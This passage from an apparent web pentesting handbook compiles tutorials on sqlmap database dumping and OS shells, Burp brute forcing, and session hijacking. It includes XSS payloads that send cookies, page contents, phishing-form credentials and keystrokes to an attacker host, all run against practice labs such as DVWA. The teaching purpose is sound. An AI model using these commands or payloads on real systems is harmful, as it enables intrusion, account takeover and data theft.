range of tests to see whether the credentials management system of your database has 
weaknesses. 
Enter the following command: 
$ sqlmap.py -u “<URL>” --batch --password 
Again, you need to substitute your site’s URL for the <URL> marker. 
When you run this command, sqlmap will initiate a series of tests and give you a number of 
options along the way. 
The sqlmap run will try a time-based blind SQLI and then a UNION-based blind attack. It will 
then give you the option to store password hashes to a file for analysis with another tool and 
then gives the opportunity for a dictionary-based attack. 
The services will try a series of well-known user account names and cycle through a list of 
often-used passwords against each candidate username. This is called a “cluster bomb” attack. 
The files suite of sqlmap includes a file of payloads for this attack but you can supply your own 
file instead. 
Whenever sqlmap hits a username and password combination, it will display it. All actions for 
the run are then written to a log file before the program ends its run. 
[[ PAGE 276 ]]
Get a list of databases on your system and their tables 
Information is power and hackers first need to know what database instances you have on 
your system in order to hack into them. You can find out whether this basic information can be 
easily accessed by intruders with the following command: 
$ sqlmap.py -u “<URL>” --batch --dbs 
This test will include time-based, error-based, and UNION-based SQL injection attacks. It will 
then identify the DBMS brand and then list the database names. The information derived 
during the test run is then written to a log file as the program terminates. 
Investigate a little further and get a list of the tables in one of those databases with the 
following command. 
$ sqlmap.py -u “<URL>” --batch --tables -D <DATABASE> 
Enter the name of one of the database instances that you got from the list in the first query of 
this section. 
This test batch includes time-based, error-based, and UNION-based SQL injection attacks. It 
will then list the names of the tables that are in the specified database instance. This data is 
written to a log file as the program finishes. 
Get the contents of one of those tables with the following command: 
$ sqlmap.py -u “<URL>” --batch --dump -T <TABLE> -D <DATABASE> 
Substitute the name of one of the tables you discovered for the <TABLE> marker in that 
command format. 
The test will perform a UNION-based SQL injection attack and then query the named table, 
showing its records on the screen. This information is written to a log file and then the 
program terminates. 
Simple usage 
sqlmap -u “http://target_server/” 
Specify target DBMS to MySQL 
sqlmap -u “http://target_server/” --dbms=mysql 
Using a proxy 
sqlmap -u “http://target_server/” --proxy=http://proxy_address:port 
Specify param1 to exploit 
sqlmap -u “http://target_server/param1=value1&param2=value2” -p param1 
Use POST requests 
sqlmap -u “http://target_server” --data=param1=value1&param2=value2 
Access with authenticated session 
[[ PAGE 277 ]]
sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 
cookie=’my_cookie_value’ 
Basic authentication 
sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-
type=basic --auth-cred=username:password 
Evaluating response strings 
sqlmap -u “http://target_server/” --string=”This string if query is TRUE” 
sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE” 
List databases 
sqlmap -u “http://target_server/” --dbs 
List tables of database target_DB 
sqlmap -u “http://target_server/” -D target_DB --tables 
Dump table target_Table of database target_DB 
sqlmap -u “http://target_server/” -D target_DB -T target_Table -dump 
List columns of table target_Table of database target_DB 
sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns 
Scan through TOR 
sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5 
Get OS Shell 
sqlmap -u “http://target_server/” --os-shell 
SQLMAP Post Request 
In the past using sqlmap to perform POST request based SQL injections has always been hit 
and miss (more often a miss). However I have recently had to revisit this feature and have 
found it be to much improved. Both in ease of use and accuracy. 
This is a quick step by step guide to getting it work, we are using Burp Proxy (Free Version) to 
intercept the post request. 
To perform the POST request sql injections you will need your own installation of sqlmap. 
Our online sql scanner is only configured to test GET request based injections. 
1. Browse to target site http://testasp.vulnweb.com/Login.asp 
2. Configure Burp proxy, point browser Burp (127.0.0.1:8080) with Burp set to intercept in the 
proxy tab. 
3. Click on the submit button on the login form 
4. Burp catches the POST request and waits 
[[ PAGE 278 ]]
 
5. Copy the POST request to a text file, I have called it search-test.txt and placed it in the 
sqlmap directory 
6. Run sqlmap as shown here; the option -r tells sqlmap to read the search-test.txt file to get 
the information to attack in the POST request. -p is the parameter we are attacking. 
./sqlmap.py -r search-test.txt -p tfUPass 
 
    sqlmap/0.9 - automatic SQL injection and database takeover tool 
    http://sqlmap.sourceforge.net 
 
[*] starting at: 13:26:52 
 
[13:26:52] [INFO] parsing HTTP request from 'search-test.txt' 
[13:26:52] [WARNING] the testable parameter 'tfUPass' you provided is not into the GET 
[13:26:52] [WARNING] the testable parameter 'tfUPass' you provided is not into the Cookie 
[13:26:52] [INFO] using '/home/testuser/sqlmap/output/testasp.vulnweb.com/session' as 
session file 
[13:26:52] [INFO] resuming injection data from session file 
[13:26:52] [WARNING] there is an injection in POST parameter 'tfUName' but you did not 
provided it this time 
[13:26:52] [INFO] testing connection to the target url 
[13:26:53] [INFO] testing if the url is stable, wait a few seconds 
[13:26:55] [INFO] url is stable 
[[ PAGE 279 ]]
[13:26:55] [WARNING] heuristic test shows that POST parameter 'tfUPass' might not be 
injectable 
[13:26:55] [INFO] testing sql injection on POST parameter 'tfUPass' 
[13:26:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' 
[13:27:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' 
[13:27:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause' 
[13:27:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING 
clause' 
[13:27:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' 
[13:27:12] [INFO] testing 'MySQL > 5.0.11 stacked queries' 
[13:27:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries' 
[13:27:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries' 
[13:27:30] [INFO] POST parameter 'tfUPass' is 'Microsoft SQL Server/Sybase stacked queries' 
injectable 
[13:27:30] [INFO] testing 'MySQL > 5.0.11 AND time-based blind' 
[13:27:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind' 
[13:27:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind' 
[13:27:42] [INFO] POST parameter 'tfUPass' is 'Microsoft SQL Server/Sybase time-based blind' 
injectable 
[13:27:42] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns' 
[13:27:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns' 
[13:27:48] [WARNING] using unescaped version of the test because of zero knowledge of the 
back-end DBMS 
sqlmap got a 302 redirect to /Search.asp - What target address do you want to use from now 
on? http://testasp.vulnweb.com:80/Login.asp (default) or provide another target address 
based also on the redirection got from the application 
 
> 
[13:27:58] [INFO] target url appears to be UNION injectable with 2 columns 
POST parameter 'tfUPass' is vulnerable. Do you want to keep testing the others? [y/N] N 
sqlmap identified the following injection points with a total of 68 HTTP(s) requests: 
--- 
Place: POST 
Parameter: tfUPass 
[[ PAGE 280 ]]
    Type: stacked queries 
    Title: Microsoft SQL Server/Sybase stacked queries 
    Payload: tfUName=test&tfUPass=test'; WAITFOR DELAY '0:0:5';-- AND 'mPfC'='mPfC 
 
    Type: AND/OR time-based blind 
    Title: Microsoft SQL Server/Sybase time-based blind 
    Payload: tfUName=test&tfUPass=test' WAITFOR DELAY '0:0:5'-- AND 'wpkc'='wpkc 
--- 
 
[13:28:08] [INFO] testing MySQL 
[13:28:09] [WARNING] the back-end DBMS is not MySQL 
[13:28:09] [INFO] testing Oracle 
[13:28:10] [WARNING] the back-end DBMS is not Oracle 
[13:28:10] [INFO] testing PostgreSQL 
[13:28:10] [WARNING] the back-end DBMS is not PostgreSQL 
[13:28:10] [INFO] testing Microsoft SQL Server 
[13:28:16] [INFO] confirming Microsoft SQL Server 
[13:28:28] [INFO] the back-end DBMS is Microsoft SQL Server 
web server operating system: Windows 2003 
web application technology: ASP.NET, Microsoft IIS 6.0 
back-end DBMS: Microsoft SQL Server 2005 
[13:28:28] [WARNING] HTTP error codes detected during testing: 
500 (Internal Server Error) - 42 times 
[13:28:28] [INFO] Fetched data logged to text files under 
'/home/testuser/sqlmap/output/testasp.vulnweb.com' 
 
[*] shutting down at: 13:28:28 
https://hackertarget.com/sqlmap-post-request-injection/ 
SQLMap Get Request 
SQLMap is a great tool that can automate injections. Here’s how to do a simple SQLi with an 
HTTP GET request. 
[[ PAGE 281 ]]
Going to the “View Blogs” page in Mutillidae, we have a drop down menu of authors. With 
intercept on in Burpe Suite, we query the request for admin blog. 
 
Burpe Suite gets the request 
 
Which we copy and paste into a new file which I’ll call attack.txt. Reading the file confirms the 
request is there. 
 
Running sqlmap via command 
sqlmap -r attack.txt --dbs 
[[ PAGE 282 ]]
to get a list of databases that will show which databases are available. The purpose of taking 
the GET request and putting it into a file and passing it to sqlmap is to let sqlmap get whatever 
data it needs from the request instead of us putting it in manually. 
A few minutes later sqlmap finishes and we have a list of DBs. 
 
From here we can select a DB and then enumerate tables and then dump the data. 
We’ll pick ‘nowasp’ for enumerating some tables. 
sqlmap -r attack.txt -D nowasp --tables 
[[ PAGE 283 ]]
 
Next we’ll dump the info in the accounts table 
sqlmap -r attack.txt -D nowasp -T accounts --dump 
 
https://hausec.com/web-pentesting-write-ups/mutillidae/sqlinjections/sqlmap-get-requests/ 
Bypass Authentication 
Authentication is the process of validating something as authentic. When a client makes a 
request to a web server for accessing a resource, sometimes the web server has to verify the 
user’s identity. For that the user will have to supply some credentials and the web server 
validates it. All subsequent decisions are then taken on the basis of the credentials supplied by 
the client. This process is called Authentication. Once the user is Authenticated, the web server 
sets up the appropriate permissions for the user on its resources. Whenever the user tries to 
access a resource, the server will check if the user has appropriate permissions to access the 
[[ PAGE 284 ]]
resource or not. This process is called Authorization. In this article we will look at some of the 
common types of Authentication used these days, discuss the vulnerabilities in them, and then 
move on to some attacks against these Authentication typePlease note that we will be using 
Burpsuite in this article for analyzing the requests sent through. Burpsuite is available by 
default in Backtrack. In order to intercept the requests and manipulate them, we must 
configure our browser to use Burp’s proxy, which is 127.0.0.1:8080 by default. We will also be 
using Wireshark a bit. 
 
Once this is done, open up Burpsuite, go to Proxy–>Intercept and make sure Intercept is on. 
 
˜ 
Now go to the options tab and check to see if the proxy is listening on port 8080. Also make 
sure “Generate CA-signed per-host certificates” option is checked. Each time the user connects 
to a SSL protected website, Burpsuite will generate a server certificate for that host, signed by 
a unique CA certificate which is generated in Burpsuite during its installation. The purpose of 
this is to reduce the SSL errors that occur because of the proxy in between. 
[[ PAGE 285 ]]
 
Now that we have set up Burpsuite and the configurations in our browser properly, we can 
intercept requests. Please note that whenever you send a request, it will be intercepted by 
Burpsuite and you will have to forward it manually. Hence it is advisable to keep “intercept is 
on” option checked only when you really want to see the contents of the packets going 
through. 
Types of authentication 
1. HTTP-basic authentication 
HTTP-Basic authentication uses a combination of a username and password to 
authenticate the user. The process starts when a user sends a GET request for a resource 
without providing any authentication credentials. The request is intercepted by Burpsuite and 
looks something like this. 
 
The server responds back with a “Authorization Required” message in its header. We can see 
the packet in Wireshark. As we can see from the header, the authentication is of the type 
“Basic”. The browser is quick to recognize this and displays a popup to the user requesting for 
a Username and a Password. Note that the popup is displayed by the browser and not the web 
application. 
[[ PAGE 286 ]]
 
Once we type in the username and password and intercept the request again using Burpsuite, 
we get something as shown in the figure below.The last line says “Authorization: Basic 
aW5mb3NlYzppbmZvc2VjaW5zdGl0dXRl”. This is basically the extra thing being passed in the 
header now. The text after Basic holds the key. These are basically the credentials in encoded 
form.The username and password are concatenated with a colon (:) in between and the whole 
thing is then encoded using the Base64 algorithm. For example, if the username is “infosec” 
and the password is “infosecinstitute” then the whole thing “infosec:infosecinstitute” is 
encoded using the Base 64 algorithm.The server then gets the header value, decodes it to get 
the credentials and grants access to the user if the credentials are correct. The point to note 
here is that it is very trivial to decode the encoded string to obtain the credentials, hence it is 
widely vulnerable to eavesdropping attacks. 
 
Wireshark is able to recognize this and automatically decodes the string to reveal the 
credentials as shown in the figure below. 
 
As we can see from the Credentials sections, the username and password are “infosec” and 
“infosecinstitute” respectively. One of the problems with HTTP-Basic Authentication is that the 
data is being passed over in plaintext. This risk can be removed by using SSL, which will send 
the data in encrypted format, and hence the value in the Authorization header will not be 
visible. However it will still be vulnerable to many client side attacks, including MITM. It is also 
vulnerable to Brute force attacks which we will see in the coming sections. 
[[ PAGE 287 ]]
2. HTTP-digest authentication 
Digest Authentication was designed as an improvement over the HTTP Basic Authentication. 
One of the major improvements is that the data is not passed over in cleartext but in 
encrypted format. The user first makes a request to the page without any credentials. The 
server replies back with a WWW-Authenticate header indicating that credentials are required 
to access the resource. The server also sends back a random value which is usually called a 
“nonce”. The browser then uses a cryptographic function to create a message digest of the 
username, password, nonce, the HTTP methods, and the URL of the page. The cryptographic 
function used in this case is a one way function, meaning that the message digest can be 
created in one direction but cannot be reversed back to reveal the values that created it. By 
default, Digest authentication uses MD5 cryptographic hashing algorithm. 
Digest Access authentication is less vulnerable to Eavesdropping attacks than Basic 
Authentication, but is still vulnerable to replay attacks, i.e., if a client can replay the message 
digest created by the encryption, the server will allow access to the client. However, to thwart 
this kind of attack, server nonce sometimes also contains timestamps. Once the server gets 
back the nonce, it checks its attributes and if the time duration is exceeded, it may reject the 
request from the client. One of the other good things about Digest access authentication is 
that the attacker will have to know all the other 4 values (username, nonce, url, http method) 
in order to carry out a Dictionary or a Brute force attack. This process is more computationally 
expensive than simple brute force attacks and also has a larger keyspace which makes brute 
force attack less likely to succeed. 
3. Form based authentication 
Form Based Authentication uses a form (usually in html) with input tags to allow users to enter 
their username and password. Once the user submits the information, it is passed over 
through either GET or POST methods via HTTP or HTTPs to the server. On the server side if the 
credentials are found to be correct, then the user is authenticated and some random token 
value or session id is given to the user for subsequent requests. One of the good features of 
Form Based authentication is that their is no standardized way of encoding or encrypting the 
username/password, and hence it is highly customizable, which makes it immune to the 
common attacks which were successful against HTML Basic and Digest Authentication 
mechanisms. Form Based Authentication is by far the most popular authentication method 
used in Web applications. Some of the issues with Form Based Authentication is that 
credentials are passed over in plaintext unless steps such as employment of TLS (Transport 
Layer Security) are not taken. 
Let’s see an example of Form Based Authentication. We will be using DVWA (Damn vulnerable 
web application) for our exercise as we will be using the same for carrying out a brute force 
attack against Form based authentication. DVWA can be downloaded from here. 
Once you have downloaded and installed it, login with the default credentials 
{admin/password} and click on the Brute Force tab on left side and click on View Source to 
view the source. Please note that the Security level is set to high in my case. As we can see the 
form accepts the username and password, validates it to remove any sort of special characters 
which could be used to perform SQL injection, and then sends it over to a sql query where the 
credentials are checked against the database to see if they are correct or not. 
[[ PAGE 288 ]]
 
let’s input any username/password and intercept the result using Burpsuite. Here is what it 
should look like in your case. 
 
Attacking web authentication 
In this section we will be carrying out a bruteforce attack against form based authentication 
for Security level “High” in DVWA. Please note that brute force attacks may not work in all 
cases. In some cases websites will start rejecting your requests after some specified number of 
unsuccessful tries. Also, some websites may use CAPTCHA to validate if a human is indeed 
making the request or not. 
To carry out a brute force attack, we will be using the intruder feature in Burpsuite. Some of 
the things required for this attack are a list of common usernames and passwords. Go to the 
form and submit a request using any username/password for now, then intercept the request. 
Once you have the request, right click on it and click on “send to intruder” 
[[ PAGE 289 ]]
 
This will send the request information to the intruder. Go to the intruder tab. Now we will 
have to configure Burpsuite to launch the brute force attack. Under the target tab, we can see 
that it has already set the target by looking at the request. 
 
Go to the positions tab now, here we can see the request which we had previously sent to 
intruder. Some of the things are highlighted in the request. This is basically a guess by 
Burpsuite to figure out what all things will be changing with each request in a Brute force 
attack. Since in this case only username and password will be changing with each request, we 
need to configure Burp accordingly. 
 
Click on the clear button on the right hand side. This will remove all the highlighted text, now 
we need to configure Burp to only set the username and password as the parameters for this 
attack. Highlight the username from this request (in this case “infosec”) and click on Add. 
Similarly, highlight the password from this request and click on Add. This will add the 
username and password as the first and second parameters. Once you are done, your output 
should look something like this. 
[[ PAGE 290 ]]
 
The next thing we need to do is set the Attack type for this attack, which is found at the top of 
the request we just modified. By default it is set to Sniper. However, in our case we will be 
using the Attack type “Cluster Bomb”. For more details on which attack is suitable for which 
scenario, please read Burp’s documentation. Basically the idea of cluster bomb is to use 
Multiple payload sets (1 for username and 1 for the password). The attack will start by trying 
all the values in Payload 1 with first value in Payload 2, then by trying all the values in Payload 
1 with second value in Payload 2 and so on. As we can see in the image below, our attack type 
is set to “Cluster Bomb”. 
 
Go to the payload tab, make sure payload set 1 is selected, click on load and load the file 
containing a list of usernames. In my case I am using a very small file just for demonstrations 
purposes. Once you load the file all the usernames will be displayed as shown in the image 
below. 
 
Similarly select payload set 2, click on load and load the file containing a list of passwords. 
 
[[ PAGE 291 ]]
Go to the options tab now and make sure “store requests” and “store response” options are 
set under results. Have a look at all the options and see if you need or don’t need any of these 
options. 
 
All right we are now set to launch our attack. Click on intruder on the top left and click on 
“start attack”. We will see a windows pop up with all the requests being made. So how do we 
know which request is successful ? Usually a successful request will have a different response 
than an unsuccessful request or will have a different status response. In this case we see that 
the request with the username “admin” and the password “password” has a response of 
different length than the other responses. 
 
Let’s click on the request with a different length response. If we click on the response section, 
we see the text “Welcome to the password protected area admin” in the response. This 
confirms that the username/password used in this request is the correct one. 
[[ PAGE 292 ]]
 
Session Hijacking 
A session can be defined as server-side storage of information that is desired to persist 
throughout the user's interaction with the website or web application. It is a semi-permanent 
interactive information interchange, also known as a dialogue, a conversation, or a meeting, 
between two or more communicating devices, or between a computer and user. 
 
Importance of Session 
Instead of storing large and constantly changing information via cookies in the user's browser, 
only a unique identifier is stored on the client-side, called a session id. This session id is passed 
[[ PAGE 293 ]]
to the webserver every time the browser makes an HTTP request. The web application pairs 
this session id with its internal database and retrieves the stored variables for use by the 
requested page. HTTP is a stateless protocol & session management facilitates the applications 
to uniquely determine a certain user across several numbers of discrete requests as well as to 
manage the data, which it accumulates about the stance of the interaction of the user with the 
application. 
What is Session Hijacking? 
HTTP is a stateless protocol and session cookies attached to every HTTP header are the most 
popular way for the server to identify your browser or your current session. To perform 
session hijacking, an attacker needs to know the victim’s session ID (session key). This can be 
obtained by stealing the session cookie or persuading the user to click a malicious link 
containing a prepared session ID. In both cases, after the user is authenticated on the server, 
the attacker can take over (hijack) the session by using the same session ID for their own 
browser session. The server is then fooled into treating the attacker’s connection as the 
original user’s valid session. 
There are several problems with session IDs: 
i.Many popular Web sites use algorithms based on easily predictable variables, such as time or 
IP address to generate the session IDs, causing them to be predictable. If encryption is not 
used (typically, SSL), session IDs are transmitted in the clear and are susceptible to 
eavesdropping. 
ii.Session hijacking involves an attacker using brute force captured or reverse-engineered 
session IDs to seize control of a legitimate user's session while that session is still in progress. 
In most applications, after successfully hijacking a session, the attacker gains complete access 
to all of the user's data and is permitted to perform operations instead of the user whose 
session was hijacked. 
iii.Session IDs can also be stolen using script injections, such as cross-site scripting. The user 
executes a malicious script that redirects the private user's information to the attacker. 
[[ PAGE 294 ]]
 
One particular danger for larger organizations is that cookies can also be used to identify 
authenticated users in single sign-on systems (SSO). This means that a successful session hijack 
can give the attacker SSO access to multiple web applications, from financial systems and 
customer records to line-of-business systems potentially containing valuable intellectual 
property. 
Main methods of Session Hijacking 
i.XSS: XSS enables attackers to inject client-side scripts into web pages viewed by other users. A 
cross-site scripting vulnerability may be used by attackers to bypass access controls such as the 
same-origin policy. 
[[ PAGE 295 ]]
 
ii.Session Side-Jacking: Sidejacking refers to the use of unauthorized identification credentials to 
hijack a valid Web session remotely in order to take over a specific web server. 
 
iii.Session Fixation: Session Fixation attacks attempt to exploit the vulnerability of a system that 
allows one person to fixate (find or set) another person's session identifier. 
[[ PAGE 296 ]]
iv.Cookie Theft By Malware or Direct Attack: Cookie theft occurs when a third party copies 
unencrypted session data and uses it to impersonate the real user. Cookie theft most often 
occurs when a user accesses trusted sites over an unprotected or public Wi-Fi network. 
v.Brute Force: A brute force attack consists of an attacker submitting many passwords or 
passphrases with the hope of eventually guessing correctly. The attacker systematically checks 
all possible passwords and passphrases until the correct one is found. Alternatively, the 
attacker can attempt to guess the key which is typically created from the password using a key 
derivation function. 
Real-World Example 
In 2001, a vulnerability was reported in the application servers and development tools 
provider company’s application server platform, where a user who authenticates with them 
receives a session id and a random unique identifier. This session id and identifier remain 
active for up to 15s after the user logs in, and a subsequent user can make use of those 
credentials to hijack the logged-in account. 
What is Session Riding? 
A session riding attack (also called a Cross-Site Request Forging attack) is a technique to spoof 
requests on behalf of other users. With Session Riding it is possible to send commands to a 
Web application on behalf of the targeted user by just sending this user an email or tricking 
him into visiting a (not per se malicious but) specially crafted website. Among the attacks that 
may be carried out by means of Session Riding are deleting user data, executing online 
transactions like bids or orders, sending spam, triggering commands inside an intranet from 
the Internet, changing the system and network configurations, or even opening the firewall. 
The principle that forms the basis of Session Riding is not restricted to cookies. Basic 
Authentication is subject to the same problem: once a login is established, the browser 
automatically supplies the authentication credentials with every further request automatically. 
Primary methods of Session Riding 
i.The victim is tricked into clicking a link or loading a page through social engineering and 
malicious links. 
ii.Sending a crafted, legitimate-looking request from the victim’s browser to the website. The 
request is sent with values chosen by the attacker including any cookies that the victim has 
associated with that website. 
https://www.safe.security/resources/blog/introduction-to-session-hijacking-and-riding/  
After minimizing the HTTP request, we can now start developing the JavaScript code that will 
execute this attack in the context of the admin user directly from the victim browser. In the 
following example, we are going to send the email to our own email account on the Atmail 
server (attacker@test.local). Please note that this account was created only to better see the 
outcome of the attack. The attacker obviously does not need an account on the target server. 
We will create a new JavaScript file called atmail_sendmail_XHR.js containing the code from 
Listing 31. If this code executes correctly, it should send an email to the attacker@offsec.local 
email address on behalf of the admin@offsec.local user. Most importantly, this will all be 
automated and done without any interaction by the logged-in admin Atmail user. 
[[ PAGE 297 ]]
 
The Session Hijacking attack consists of the exploitation of the web session control mechanism, 
which is normally managed for a session token. 
Because http communication uses many different TCP connections, the web server needs a 
method to recognize every user’s connections. The most useful method depends on a token 
that the Web Server sends to the client browser after a successful client authentication. A 
session token is normally composed of a string of variable width and it could be used in 
different ways, like in the URL, in the header of the http requisition as a cookie, in other parts 
of the header of the http request, or yet in the body of the http requisition. 
The Session Hijacking attack compromises the session token by stealing or predicting a valid 
session token to gain unauthorized access to the Web Server. 
The session token could be compromised in different ways; the most common are: 
• 
Predictable session token; 
• 
Session Sniffing; 
• 
Client-side attacks (XSS, malicious JavaScript Codes, Trojans, etc); 
• 
Man-in-the-middle attack 
• 
Man-in-the-browser attack 
Examples 
Example 1 
Session Sniffing 
In the example, as we can see, first the attacker uses a sniffer to capture a valid token session 
called “Session ID”, then they use the valid token session to gain unauthorized access to the 
Web Server. 
[[ PAGE 298 ]]
 
Figure 1. Manipulating the token session executing the session hijacking attack. 
Example 2 
Cross-site script attack 
The attacker can compromise the session token by using malicious code or programs running 
at the client-side. The example shows how the attacker could use an XSS attack to steal the 
session token. If an attacker sends a crafted link to the victim with the malicious JavaScript, 
when the victim clicks on the link, the JavaScript will run and complete the instructions made 
by the attacker. The example in figure 3 uses an XSS attack to show the cookie value of the 
current session; using the same technique it’s possible to create a specific JavaScript code that 
will send the cookie to the attacker. 
<SCRIPT> 
 
alert(document.cookie); 
 
</SCRIPT> 
[[ PAGE 299 ]]
 
https://owasp.org/www-community/attacks/Session_hijacking_attack 
XSS Attack 1: Hijacking the user’s session 
Most web applications maintain user sessions in order to identify the user across 
multiple HTTP requests. Sessions are identified by session cookies. 
For example, after a successful login to an application, the server will send you a session 
cookie by the Set-Cookie header. Now, if you want to access any page in the application or 
submit a form, the cookie (which is now stored in the browser) will also be included in all the 
requests sent to the server. This way, the server will know who you are. 
Thus, session cookies are sensitive information which, if compromised, may allow an attacker 
to impersonate the legitimate user and gain access to his existing web session. This attack is 
called session hijacking. 
JavaScript code running in the browser can access the session cookies (when they lack the 
flag HTTPOnly) by calling document.cookie. So, if we inject the following payload into 
our name parameter, the vulnerable page will show the current cookie value in an alert box: 
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</scrip
t>COPY 
[[ PAGE 300 ]]
 
Now, in order to steal the cookies, we have to provide a payload which will send the cookie 
value to the attacker-controlled website. 
The following payload creates a new Image object in the DOM of the current page and sets 
the src attribute to the attacker’s website. As a result, the browser will make an HTTP request 
to this external website (192.168.149.128) and the URL will contain the session cookie. 
<script>new 
Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>COPY 
So here is the attack URL which will send the cookies to our server: 
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>new  
Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>COPY 
When the browser receives this request, it executes the JavaScript payload, which makes a 
new request to 192.168.149.128, along with the cookie value in the URL, as shown below. 
 
If we listen for an incoming connection on the attacker-controlled server (192.168.149.128), 
we can see an incoming request with cookie values (security and PHPSESSID) appended in the 
URL. The same information can be found in the access.log file on the server. 
[[ PAGE 301 ]]
 
Using the stolen cookie 
With the above cookie information, if we access any internal page of the application and 
append the cookie value in the request, we can access the page on behalf of the victim, in its 
own session (without knowing the username and password). Basically, we have hijacked the 
user’s session. 
 
 
[[ PAGE 302 ]]
 
 
The HTTPOnly cookie attribute can help to mitigate this scenario by preventing access to the 
cookie value through JavaScript. It can be set when initializing the cookie value (via Set-
Cookie header). 
XSS Attack 2: Perform unauthorized activities 
If the HTTPOnly cookie attribute is set, we cannot steal the cookies through JavaScript. 
However, using the XSS attack, we can still perform unauthorized actions inside the application 
on behalf of the user. 
For instance, in this attack scenario, we will post a new message in the Guestbook on behalf of 
the victim user, without his consent. For this, we need to forge an HTTP POST request to the 
Guestbook page with the appropriate parameters with JavaScript. 
The following payload will do this by creating an XMLHTTPRequest object and setting the 
necessary header and data: 
<script> 
 
 
var xhr = new XMLHttpRequest(); 
[[ PAGE 303 ]]
 
 
xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true); 
 
 
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); 
 
 
xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook'); 
 
</script>COPY 
This is how the request looks like in the browser and also intercepted in Burp. 
 
 
The script on execution will generate a new request to add a comment on behalf of the user. 
[[ PAGE 304 ]]
 
 
XSS Attack 3: Phishing to steal user credentials 
XSS can also be used to inject a form into the vulnerable page and use this form to collect user 
credentials. This type of attack is called phishing. 
The payload below will inject a form with the message Please login to proceed, along 
with username and password input fields. 
When accessing the link below, the victim may enter its credentials in the injected form. Note 
that we can modify the payload to make it look like a legitimate form as per our need. 
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> 
<form action=http://192.168.149.128>Username:<br><input type="username" 
name="username"></br>Password:<br><input type="password" 
name="password"></br><br><input type="submit" value="Logon"></br>COPY 
[[ PAGE 305 ]]
 
Once the user enters their credentials and clicks on the Logon button, the request is sent to 
the attacker-controlled server. The request can be seen in the screenshots below: 
 
The credentials entered by the user (pentest: pentest) can be seen on the receiving server. 
 
[[ PAGE 306 ]]
XSS Attack 4: Capture the keystrokes by injecting a keylogger 
In this attack scenario, we will inject a JavaScript keylogger into the vulnerable web page and 
we will capture all the keystrokes of the user within the current page. 
First of all, we will create a separate JavaScript file and we will host it on the attacker-
controlled server. We need this file because the payload is too big to be inserted in the URL 
and we avoid encoding and escaping errors. The JavaScript file contains the following code: 
 
On every keypress, a new XMLHttp request is generated and sent towards 
the keylog.php page hosted at the attacker-controlled server. The code in keylog.php writes 
the value of the pressed keys into a file called data.txt. 
 
Now we need to call the vulnerable page with the payload from our server: 
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script 
src="http://192.168.149.128/xss.js">COPY 
Once the script is loaded on the page, a new request is fired with every stroke of any key. 
[[ PAGE 307 ]]
 
The value of the parameter key is being written to the data.txt file, as shown in the screenshot 
below. 
 
XSS Attack 5: Stealing sensitive information 
Another malicious activity that can be performed with an XSS attack is stealing sensitive 
information from the user’s current session. Imagine that an internet banking application 
is vulnerable to XSS, the attacker could read the current balance, transaction information, 
personal data, etc. 
For this scenario, we need to create a JavaScript file on the attacker-controlled server. The file 
contains logic that takes a screenshot of the page where the script is running: 
 
Then we need to create a PHP file on the attacker’s server, which saves the content of 
the png parameter into the test.png file. 
[[ PAGE 308 ]]
 
Now we inject the JavaScript code into the vulnerable page by tricking the user to access the 
following URL: 
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script 
src="http://192.168.149.128/screenshot.js">COPY 
Once the JavaScript file is loaded, the script sends the data in base64 format to 
the saveshot.php file which writes the data into the test.png file. On opening the test.png file, 
we can see the screen capture of the vulnerable page. 
 
Another way 
Another way to steal the page content would be to get the HTML source code by 
using getElementById. Here is a payload that gets the innerHTML of 
the guestbook_comments element and sends it to the attacker. 
<script>new 
Image().src="http://192.168.149.128/bogus.php?output="+document.getElementById('guestb
ook_comments').innerHTML;</script>COPY 
[[ PAGE 309 ]]
 
We can also fetch the entire page source of the page by using the following payload: 
<script>new 
Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML</script
>COPY 
 
[[ PAGE 310 ]]
 
Decoding the received data in the Burp Decoder gives us the cleartext page source of the 
vulnerable page. Here, we can see the Guestbook comments. 
 
https://pentest-tools.com/blog/xss-attacks-practical-scenarios  
Cross Site Request Forgery 
Description 
CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the 
identity and privileges of the victim to perform an undesired function on the victim’s behalf 
(though note that this is not true of login CSRF, a special form of the attack described below). 
For most sites, browser requests automatically include any credentials associated with the site, 
such as the user’s session cookie, IP address, Windows domain credentials, and so forth. 
Therefore, if the user is currently authenticated to the site, the site will have no way to 
distinguish between the forged request sent by the victim and a legitimate request sent by the 
victim. 
CSRF attacks target functionality that causes a state change on the server, such as changing the 
victim’s email address or password, or purchasing something. Forcing the victim to retrieve 
data doesn’t benefit an attacker because the attacker doesn’t receive the response, the victim 
does. As such, CSRF attacks target state-changing requests. 
[[ PAGE 311 ]]
An attacker can use CSRF to obtain the victim’s private data via a special form of the attack, 
known as login CSRF. The attacker forces a non-authenticated user to log in to an account the 
attacker controls. If the victim does not realize this, they may add personal data—such as 
credit card information—to the account. The attacker can then log back into the account to 
view this data, along with the victim’s activity history on the web application. 
